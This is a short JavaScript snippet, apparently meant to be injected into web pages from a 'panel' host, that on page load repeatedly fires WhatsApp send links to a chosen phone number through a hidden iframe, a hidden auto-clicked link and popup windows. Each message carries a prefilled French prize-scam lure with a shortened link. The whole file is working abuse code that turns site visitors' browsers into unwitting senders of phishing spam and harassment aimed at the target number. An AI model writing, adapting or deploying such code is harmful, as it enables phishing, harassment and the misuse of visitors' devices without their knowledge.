/* <script src="https://ton-panel/inject.js" data-target="33612345678"></script> */
(function () {
  var me = document.currentScript
  var target = me.dataset.target
  var repeat = +(me.dataset.repeat || 8)
  var text = encodeURIComponent(me.dataset.text ||
    '🎁 FÉLICITATIONS !! Vous avez gagné 500€ → bit.ly/wx7k2')
  if (!target) return

  function fire (i) {
    var mode = i % 3
    if (mode === 0) {
      var f = document.createElement('iframe')
      f.src = 'https://wa.me/' + target + '?text=' + text
      f.style.cssText = 'width:1px;height:1px;border:0;opacity:0'
      document.body.appendChild(f)
    } else if (mode === 1) {
      var a = document.createElement('a')
      a.href = 'whatsapp://send?phone=' + target + '&text=' + text
      a.style.display = 'none'; document.body.appendChild(a); a.click()
    } else {
      window.open('https://web.whatsapp.com/send?phone=' + target + '&text=' + text, '_blank')
    }
  }
  var i = 0
  var id = setInterval(function () { fire(i++); if (i >= repeat) clearInterval(id) }, 700)
})()
